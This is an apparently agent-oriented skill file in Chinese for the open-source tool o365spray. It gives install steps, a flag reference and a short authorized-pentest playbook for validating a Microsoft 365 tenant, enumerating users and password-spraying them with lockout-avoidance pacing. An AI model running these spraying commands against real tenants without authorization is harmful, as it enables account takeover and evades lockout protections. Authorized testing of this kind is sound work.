---
name: o365spray-m365
description: 渗透工具 skill:o365spray 的安装、参数速查与攻击场景 playbook。当任务涉及 暴力破解与口令喷射 需要调用 o365spray 时使用。
when-to-use: 渗透工具 skill:o365spray 的安装、参数速查与攻击场景 playbook。当任务涉及 暴力破解与口令喷射 需要调用 o365spray 时使用。
---

# o365spray

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/0xZDH/o365spray
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/0xZDH/o365spray && cd o365spray && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `--enum -U users.txt` | M365 用户名枚举 |
| `--spray -U users.txt -P passwords.txt` | 口令喷射 |
| `--count 1 --lockout 15` | 防锁定节奏控制 |
| `-v` | 看每步请求 |
| `--validate` | 先验证租户是否 M365 |

## 攻击场景 Playbook

### M365 租户口令喷洒(授权)

```bash
python3 o365spray.py --validate -e target.com
python3 o365spray.py --enum -U users.txt
python3 o365spray.py --spray -U valid.txt -P seasons.txt --count 1 --lockout 15
```

## 注意事项

撞 Microsoft 锁定策略(--lockout);枚举用 AutoDiscover 响应差, spray 走 OAuth2 认证接口。
